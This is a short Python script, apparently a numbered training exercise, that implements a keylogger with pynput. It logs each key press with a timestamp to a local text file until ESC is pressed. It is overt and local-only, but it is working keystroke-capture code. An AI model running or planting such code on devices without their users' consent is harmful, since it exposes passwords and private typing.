from pynput import keyboard
import logging
logging.basicConfig(filename="Task_4.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """Callback function to log the key press."""
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    """Callback function to stop the listener."""
    if key == keyboard.Key.esc:
        return False

def main():
    """Main function to start the keylogger."""
    print("Keylogger started. Press ESC to stop.")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
